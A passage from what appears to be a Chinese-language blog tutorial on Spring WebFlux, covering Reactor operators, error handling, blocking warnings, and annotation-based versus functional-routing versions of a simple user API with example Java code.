<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Flux&lt;String&gt; names = Flux.just(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">Flux&lt;Integer&gt; ages = Flux.just(<span class="number">30</span>, <span class="number">25</span>);</span><br><span class="line">Flux&lt;String&gt; zipped = names.zipWith(ages, (name, age) -&gt; name + <span class="string">&quot; is &quot;</span> + age + <span class="string">&quot; years old.&quot;</span>);</span><br><span class="line"><span class="comment">// 输出: &quot;Alice is 30 years old.&quot;, &quot;Bob is 25 years old.&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="4-错误处理-Error-Handling"><a href="#4-错误处理-Error-Handling" class="headerlink" title="4. 错误处理 (Error Handling)"></a>4. 错误处理 (Error Handling)</h5><ul>
<li><strong><code>onErrorReturn(T fallbackValue)</code></strong>: 当发生错误时，返回一个默认值并正常完成流。</li>
<li><strong><code>onErrorResume(Function&lt;Throwable, Publisher&lt;T&gt;&gt;)</code></strong>: 当发生错误时，订阅一个新的备用流 <code>Publisher&lt;T&gt;</code>。</li>
<li><strong><code>retry(long n)</code></strong>: 当发生错误时，重新订阅上游流，最多重试 n 次。</li>
</ul>
<hr>
<h5 id="5-阻塞操作-Blocking-谨慎使用！"><a href="#5-阻塞操作-Blocking-谨慎使用！" class="headerlink" title="5. 阻塞操作 (Blocking) - 谨慎使用！"></a>5. 阻塞操作 (Blocking) - 谨慎使用！</h5><p>在响应式编程中应<strong>尽量避免阻塞</strong>。但有时在测试或与遗留代码集成时，可能需要阻塞等待结果。</p>
<ul>
<li><strong><code>block()</code></strong>: <strong>阻塞</strong>当前线程，直到 <code>Mono</code> 发出元素（或完成&#x2F;出错），并返回该元素。</li>
<li><strong><code>blockFirst()</code> &#x2F; <code>blockLast()</code></strong>: 阻塞直到 <code>Flux</code> 发出第一个&#x2F;最后一个元素。</li>
</ul>
<p><strong>警告</strong>: <strong>绝对不要在由Netty等管理的非阻塞线程（如WebFlux的请求处理线程）中调用阻塞操作！</strong> 这会严重破坏响应式模型的性能优势，甚至导致线程饥饿和应用假死。</p>
<hr>
<h3 id="2-3-两种编程模型"><a href="#2-3-两种编程模型" class="headerlink" title="2.3 两种编程模型"></a>2.3 两种编程模型</h3><h4 id="2-3-1-注解驱动模式"><a href="#2-3-1-注解驱动模式" class="headerlink" title="2.3.1 注解驱动模式"></a>2.3.1 注解驱动模式</h4><h5 id="1-核心思想：熟悉的配方，响应式的味道"><a href="#1-核心思想：熟悉的配方，响应式的味道" class="headerlink" title="1. 核心思想：熟悉的配方，响应式的味道"></a>1. 核心思想：熟悉的配方，响应式的味道</h5><p>Spring WebFlux 的注解驱动模式在设计上<strong>刻意与 Spring MVC 保持了高度的一致性</strong>。其核心思想是让已经熟悉 Spring MVC 的开发者能够以最小的学习成本，快速上手响应式Web开发。</p>
<p>这意味着，你用来构建 Spring MVC 控制器的绝大部分注解，在 WebFlux 中<strong>完全适用</strong>。</p>
<p><strong>可以重用的核心注解包括</strong>:</p>
<ul>
<li><strong>类级别</strong>: <code>@RestController</code>, <code>@Controller</code></li>
<li><strong>请求映射</strong>: <code>@RequestMapping</code>, <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code></li>
<li><strong>参数绑定</strong>: <code>@PathVariable</code>, <code>@RequestParam</code>, <code>@RequestHeader</code>, <code>@RequestBody</code>, <code>@CookieValue</code></li>
</ul>
<p>你可以像写MVC Controller一样组织你的代码结构。</p>
<hr>
<h5 id="2-根本性的区别：返回类型"><a href="#2-根本性的区别：返回类型" class="headerlink" title="2. 根本性的区别：返回类型"></a>2. 根本性的区别：返回类型</h5><p>尽管注解相同，但两者在<strong>编程模型</strong>上有着根本性的区别，这主要体现在<strong>Controller方法的返回类型</strong>上。</p>
<ul>
<li><strong>Spring MVC (同步阻塞)</strong>:<ul>
<li>方法返回的是<strong>具体的数据</strong>，如 <code>User</code>, <code>List&lt;User&gt;</code>, <code>ResponseEntity&lt;User&gt;</code>。</li>
<li>当方法被调用时，它会<strong>阻塞</strong>当前线程，直到数据准备就绪（例如，数据库查询完成），然后将完整的数据返回。</li>
</ul>
</li>
<li><strong>Spring WebFlux (异步非阻塞)</strong>:<ul>
<li>方法返回的是一个<strong>发布者 (Publisher)</strong>，即 <strong><code>Mono&lt;T&gt;</code></strong> 或 <strong><code>Flux&lt;T&gt;</code></strong>。</li>
<li>你返回的不是数据本身，而是一个**“数据的承诺”<strong>或</strong>“未来数据的持有者”**。</li>
<li>方法在定义完这个“数据承诺”（即构建好响应式管道）后会<strong>立即返回</strong>，<strong>不会阻塞</strong>请求处理线程。</li>
<li>Spring WebFlux 框架会**“订阅 (subscribe)”** 你返回的 <code>Mono</code> 或 <code>Flux</code>。当数据源（如数据库、外部API）在未来某个时间点准备好数据后，数据会被<strong>推送 (push)</strong> 到这个管道中，最终由框架写入HTTP响应。</li>
</ul>
</li>
</ul>
<p><strong>返回类型总结</strong>:</p>
<ul>
<li>返回 <strong><code>Mono&lt;T&gt;</code></strong>: 当你预期API会返回 <strong>0个或1个</strong> 结果时。例如，<code>findById</code>, <code>createUser</code>。</li>
<li>返回 <strong><code>Flux&lt;T&gt;</code></strong>: 当你预期API会返回 <strong>0个或多个</strong> 结果时。例如，<code>findAll</code>, <code>searchByName</code>。</li>
<li>返回 <strong><code>Mono&lt;Void&gt;</code></strong>: 当操作成功但<strong>无需返回任何内容</strong>时。例如，<code>deleteById</code>。</li>
<li>返回 <strong><code>Mono&lt;ResponseEntity&lt;T&gt;&gt;</code></strong>: 当你需要精细化控制响应状态码或响应头时，可以将 <code>ResponseEntity</code> 包装在 <code>Mono</code> 中。</li>
</ul>
<hr>
<h5 id="3-示例：一个响应式的-UserController"><a href="#3-示例：一个响应式的-UserController" class="headerlink" title="3. 示例：一个响应式的 UserController"></a>3. 示例：一个响应式的 <code>UserController</code></h5><p>让我们通过一个具体的例子来对比和理解。</p>
<p><strong><code>User.java</code> (POJO)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个简单的User领域对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">// constructor, getters, setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>UserController.java</code> (WebFlux Controller)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/reactive/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟一个DAO/Repository</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Long, User&gt; userDb = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserController</span><span class="params">()</span> &#123;</span><br><span class="line">        userDb.put(<span class="number">1L</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1L</span>, <span class="string">&quot;Alice&quot;</span>));</span><br><span class="line">        userDb.put(<span class="number">2L</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">2L</span>, <span class="string">&quot;Bob&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取所有用户 (返回多个元素 -&gt; Flux)</span></span><br><span class="line"><span class="comment">     * 使用 text/event-stream，可以观察到数据是逐条流式返回的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(produces = MediaType.TEXT_EVENT_STREAM_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> Flux&lt;User&gt; <span class="title function_">getAllUsers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// Flux.fromIterable 将集合转换为Flux</span></span><br><span class="line">        <span class="comment">// delayElements 模拟每个元素之间有1秒的延迟，以体现&quot;流&quot;的特性</span></span><br><span class="line">        <span class="keyword">return</span> Flux.fromIterable(userDb.values())</span><br><span class="line">                   .delayElements(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据ID获取单个用户 (返回0或1个元素 -&gt; Mono)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ResponseEntity&lt;User&gt;&gt; <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userDb.get(id);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Mono.just 将一个对象包装成Mono</span></span><br><span class="line">            <span class="comment">// 返回 Mono&lt;ResponseEntity&gt; 来控制状态码</span></span><br><span class="line">            <span class="keyword">return</span> Mono.just(ResponseEntity.ok(user));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Mono.just 包装一个404的ResponseEntity</span></span><br><span class="line">            <span class="keyword">return</span> Mono.just(ResponseEntity.notFound().build());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新用户</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userMono 请求体也是一个Publisher (Mono&lt;User&gt;)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回创建后的用户 (Mono&lt;User&gt;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.CREATED)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;User&gt; <span class="title function_">createUser</span><span class="params">(<span class="meta">@RequestBody</span> Mono&lt;User&gt; userMono)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用flatMap来处理异步数据</span></span><br><span class="line">        <span class="keyword">return</span> userMono.flatMap(user -&gt; &#123;</span><br><span class="line">            <span class="comment">// 模拟生成ID并保存</span></span><br><span class="line">            <span class="type">Long</span> <span class="variable">newId</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            user.setId(newId);</span><br><span class="line">            userDb.put(newId, user);</span><br><span class="line">            <span class="comment">// 返回包含新用户的Mono</span></span><br><span class="line">            <span class="keyword">return</span> Mono.just(user);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="4-底层执行模型"><a href="#4-底层执行模型" class="headerlink" title="4. 底层执行模型"></a>4. 底层执行模型</h5><p>这个模式的背后是完全不同的线程模型。</p>
<ul>
<li><strong>Spring MVC</strong>: 默认情况下，基于Servlet API，通常采用**“一个线程处理一个请求”**的模型。如果请求中的I&#x2F;O操作（如数据库查询）阻塞了，那么这个线程也会被阻塞，直到I&#x2F;O完成。在高并发下，这会导致大量线程被创建和占用，成为系统瓶颈。</li>
<li><strong>Spring WebFlux</strong>: 通常运行在<strong>非阻塞I&#x2F;O服务器</strong>（如Netty）之上。它使用<strong>少量固定的线程（Event Loop）</strong> 来处理大量的并发请求。<ol>
<li>一个请求到达，Event Loop线程接收它。</li>
<li>该线程调用你的Controller方法。</li>
<li>Controller方法<strong>快速返回</strong>一个<code>Mono</code>或<code>Flux</code>（定义了处理流程），<strong>线程立即被释放</strong>，去处理下一个请求。</li>
<li>当响应式管道中的I&#x2F;O操作（如响应式数据库驱动）完成时，会通过<strong>回调</strong>通知Netty。</li>
<li>Event Loop线程再次被唤醒，将结果数据写入响应。</li>
</ol>
</li>
</ul>
<p><strong>核心优势</strong>：线程永远不会因为等待I&#x2F;O而阻塞，从而可以用更少的线程资源支撑更高的并发量。</p>
<hr>
<h4 id="2-3-2-函数式路由模式"><a href="#2-3-2-函数式路由模式" class="headerlink" title="2.3.2 函数式路由模式"></a>2.3.2 函数式路由模式</h4><h5 id="1-核心思想：路由即函数，处理即函数"><a href="#1-核心思想：路由即函数，处理即函数" class="headerlink" title="1. 核心思想：路由即函数，处理即函数"></a>1. 核心思想：路由即函数，处理即函数</h5><p>函数式路由模式完全摒弃了注解，将Web层的两个核心职责——**路由（Routing）**和**处理（Handling）**——显式地定义为两个独立的函数接口：</p>
<ol>
<li><strong><code>RouterFunction&lt;T extends ServerResponse&gt;</code> (路由函数)</strong>:<ul>
<li><strong>职责</strong>: 负责<strong>定义路由规则</strong>。它的作用等同于 <code>@RequestMapping</code> 注解。</li>
<li><strong>本质</strong>: 它是一个接收 <code>ServerRequest</code> 对象作为输入，返回一个 <code>Mono&lt;HandlerFunction&gt;</code> 作为输出的函数。</li>
<li><strong>工作流程</strong>: 当一个请求进来时，<code>RouterFunction</code> 会被调用。它会检查这个请求是否与自己定义的规则（如路径、HTTP方法、请求头等）匹配。<ul>
<li>如果<strong>匹配</strong>，它就返回一个包裹在 <code>Mono</code> 中的 <code>HandlerFunction</code>，告诉框架“这个请求应该由这个Handler来处理”。</li>
<li>如果<strong>不匹配</strong>，它就返回一个空的 <code>Mono</code> (<code>Mono.empty()</code>)，框架会继续尝试下一个路由规则。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>HandlerFunction&lt;T extends ServerResponse&gt;</code> (处理函数)</strong>:<ul>
<li><strong>职责</strong>: 负责<strong>处理具体的业务逻辑</strong>。它的作用等同于 <code>@Controller</code> 中的方法体。</li>
<li><strong>本质</strong>: 它是一个接收 <code>ServerRequest</code> 对象作为输入，返回一个 <code>Mono&lt;ServerResponse&gt;</code> 作为输出的函数。</li>
<li><strong>工作流程</strong>: 当路由匹配成功后，这个函数被调用。它从 <code>ServerRequest</code> 中提取数据（路径变量、参数、请求体），执行业务逻辑，并构建一个 <code>ServerResponse</code>（包含了状态码、响应头、响应体）包装在 <code>Mono</code> 中返回。</li>
</ul>
</li>
</ol>
<p><strong>对比注解模式</strong>:</p>
<table>
<thead>
<tr>
<th align="left">职责</th>
<th align="left">注解驱动模式</th>
<th align="left">函数式路由模式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>路由</strong></td>
<td align="left"><code>@RequestMapping</code> 及其变体</td>
<td align="left"><code>RouterFunction</code></td>
</tr>
<tr>
<td align="left"><strong>处理</strong></td>
<td align="left"><code>@Controller</code> 中的方法</td>
<td align="left"><code>HandlerFunction</code></td>
</tr>
<tr>
<td align="left"><strong>耦合方式</strong></td>
<td align="left">注解将路由和处理耦合在方法上</td>
<td align="left">路由和处理是两个独立的函数，通过配置将它们组合在一起</td>
</tr>
</tbody></table>
<hr>
<h5 id="2-核心组件与API"><a href="#2-核心组件与API" class="headerlink" title="2. 核心组件与API"></a>2. 核心组件与API</h5><p>为了方便地构建这两个函数，Spring WebFlux 提供了一些实用的工具类：</p>
<ul>
<li><strong><code>RouterFunctions</code></strong>:<ul>
<li>一个<strong>工具类</strong>，提供了大量的静态方法来创建 <code>RouterFunction</code>。</li>
<li><code>route()</code>: 创建路由的入口。</li>
<li><code>nest()</code>: 用于创建嵌套路由，相当于类级别的 <code>@RequestMapping</code>。</li>
<li><code>and()</code> &#x2F; <code>andRoute()</code>: 用于将多个路由规则组合在一起。</li>
</ul>
</li>
<li><strong><code>RequestPredicates</code></strong>:<ul>
<li>一个<strong>工具类</strong>，提供了各种用于匹配请求的<strong>谓词 (Predicate)</strong>。</li>
<li><code>GET(pattern)</code>: 匹配GET方法和指定路径。</li>
<li><code>POST(pattern)</code>, <code>PUT(pattern)</code>, <code>DELETE(pattern)</code> 等。</li>
<li><code>accept(MediaType)</code>: 匹配 <code>Accept</code> 请求头。</li>
<li><code>contentType(MediaType)</code>: 匹配 <code>Content-Type</code> 请求头。</li>
<li><code>path(pattern)</code>: 只匹配路径。</li>
</ul>
</li>
<li><strong><code>ServerRequest</code></strong>:<ul>
<li>对 <code>HttpServletRequest</code> 的响应式、不可变封装。</li>
<li>提供了获取路径变量、查询参数、请求头、请求体 (<code>bodyToMono</code>, <code>bodyToFlux</code>) 的响应式方法。</li>
</ul>
</li>
<li><strong><code>ServerResponse</code></strong>:<ul>
<li>对 <code>HttpServletResponse</code> 的响应式、不可变封装。</li>
<li>提供了一个<strong>流式的构建器 (Builder)</strong> 来创建响应，可以方便地设置状态码、响应头、响应体等。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-示例：使用函数式模式重写-UserController"><a href="#3-示例：使用函数式模式重写-UserController" class="headerlink" title="3. 示例：使用函数式模式重写 UserController"></a>3. 示例：使用函数式模式重写 <code>UserController</code></h5><p>我们将之前注解模式的 <code>UserController</code> 用函数式的方式重写，通常会把路由定义和处理逻辑分开。</p>
<p><strong>Step 1: 创建 <code>UserHandler</code> (处理逻辑)</strong></p>
<p>这个类不依赖任何Spring MVC的注解，是一个纯粹的业务处理类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span> <span class="comment">// 仍然是一个Spring Bean，以便注入其他服务</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设有一个响应式的 UserService</span></span><br><span class="line">    <span class="comment">// @Autowired</span></span><br><span class="line">    <span class="comment">// private UserService userService;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟的DAO/Repository</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Long, User&gt; userDb = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        userDb.put(<span class="number">1L</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1L</span>, <span class="string">&quot;Alice&quot;</span>));</span><br><span class="line">        userDb.put(<span class="number">2L</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">2L</span>, <span class="string">&quot;Bob&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理获取所有用户的请求 (HandlerFunction)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">getAllUsers</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        Flux&lt;User&gt; users = Flux.fromIterable(userDb.values());</span><br><span class="line">        <span class="keyword">return</span> ServerResponse.ok()</span><br><span class="line">                .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">                .body(users, User.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理根据ID获取用户的请求 (HandlerFunction)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">getUserById</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">id</span> <span class="operator">=</span> Long.valueOf(request.pathVariable(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userDb.get(id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ServerResponse.ok()</span><br><span class="line">                    .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">                    .body(Mono.just(user), User.class);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ServerResponse.notFound().build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理创建用户的请求 (HandlerFunction)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">createUser</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        Mono&lt;User&gt; userMono = request.bodyToMono(User.class);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> userMono.flatMap(user -&gt; &#123;</span><br><span class="line">            <span class="comment">// 模拟保存</span></span><br><span class="line">            <span class="type">Long</span> <span class="variable">newId</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            user.setId(newId);</span><br><span class="line">            userDb.put(newId, user);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> ServerResponse.status(HttpStatus.CREATED)</span><br><span class="line">                    .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">                    .body(Mono.just(user), User.class);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Step 2: 创建 <code>UserRouter</code> (路由定义)</strong></p>
<p>这个类使用 <code>@Configuration</code> 和 <code>@Bean</code> 来定义路由规则，并将它们与 <code>UserHandler</code> 中的方法关联起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunction;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunctions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.web.reactive.function.server.RequestPredicates.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.web.reactive.function.server.RouterFunctions.route;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRouter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">userRoutes</span><span class="params">(UserHandler userHandler)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> route(GET(<span class="string">&quot;/functional/users&quot;</span>), userHandler::getAllUsers)</span><br><span class="line">                .andRoute(GET(<span class="string">&quot;/functional/users/&#123;id&#125;&quot;</span>), userHandler::getUserById)</span><br><span class="line">                .andRoute(POST(<span class="string">&quot;/functional/users&quot;</span>), userHandler::createUser);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以使用嵌套路由，更清晰</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">nestedUserRoutes</span><span class="params">(UserHandler userHandler)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions.nest(path(<span class="string">&quot;/functional/v2/users&quot;</span>),</span><br><span class="line">                route(GET(<span class="string">&quot;&quot;</span>), userHandler::getAllUsers)</span><br><span class="line">                .andRoute(GET(<span class="string">&quot;/&#123;id&#125;&quot;</span>), userHandler::getUserById)</span><br><span class="line">                .andRoute(POST(<span class="string">&quot;&quot;</span>), userHandler::createUser)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解析</strong>:</p>
<ul>
<li>我们定义了一个类型为 <code>RouterFunction&lt;ServerResponse&gt;</code> 的Bean。Spring WebFlux会自动检测到这个Bean并用它来处理请求。</li>
<li><code>route(RequestPredicate, HandlerFunction)</code> 是核心方法，它将一个请求谓词和一个处理函数绑定在一起。</li>
<li><code>userHandler::getAllUsers</code> 是Java 8的方法引用，它指向了 <code>UserHandler</code> 中的 <code>getAllUsers</code> 方法，非常简洁。</li>
<li><code>nest()</code> 方法可以将一组路由规则嵌套在一个公共的路径前缀下，使得代码结构更清晰。</li>
</ul>
<hr>
<h5 id="4-优势与适用场景"><a href="#4-优势与适用场景" class="headerlink" title="4. 优势与适用场景"></a><strong>4. 优势与适用场景</strong></h5><p><strong>优势</strong>:</p>
<ol>
<li><strong>更高的灵活性和控制力</strong>: 路由规则是普通的Java代码，你可以使用任何编程逻辑（<code>if-else</code>, 循环, Stream API）来动态地构建路由，这是注解无法做到的。</li>
<li><strong>更好的性能（理论上）</strong>: 由于绕过了注解的反射扫描和解析过程，函数式路由在启动时和运行时的开销理论上更小。对于需要处理极高吞吐量的微服务网关等场景，这可能是一个优势。</li>
